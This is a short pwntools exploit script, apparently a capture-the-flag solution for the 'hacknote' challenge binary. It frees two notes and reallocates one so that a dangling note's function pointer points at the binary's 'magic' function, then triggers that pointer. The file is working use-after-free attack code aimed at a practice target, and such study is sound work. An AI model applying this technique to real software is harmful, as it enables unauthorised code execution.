#!/usr/bin/env python
from pwn import *
import sys
context.log_level="debug"
#context.log_level="info"
code=ELF("./hacknote",checksec=False)
context.terminal = ['gnome-terminal','-x','sh','-c']
context.arch = code.arch
if len(sys.argv)>2:
    con=remote(sys.argv[1],int(sys.argv[2]))
else:
    con=code.process()

def z(commond=""):
    gdb.attach(con,commond)
def add(size,data):
    con.sendlineafter("choice :","1")
    con.sendlineafter("size :",str(size))
    con.sendafter("Content :",data)
    con.recvuntil("Success !")
def delete(index):
    con.sendlineafter("choice :","2")
    con.sendlineafter("Index :",str(index))
    con.recvuntil("Success\n")
def printnote(index):
    con.sendlineafter("choice :","3")
    con.sendlineafter("Index :",str(index))
def exploit():
    add(0x30,"a"*8)
    add(0x30,"a"*8)
    #create Dangling Pointer 
    delete(0) 
    delete(1)
    
    # create fake note,make function pointer to magic function
    add(4,p32(code.symbols['magic']))
    # uaf
    printnote(0) 
    
exploit()
con.interactive()    
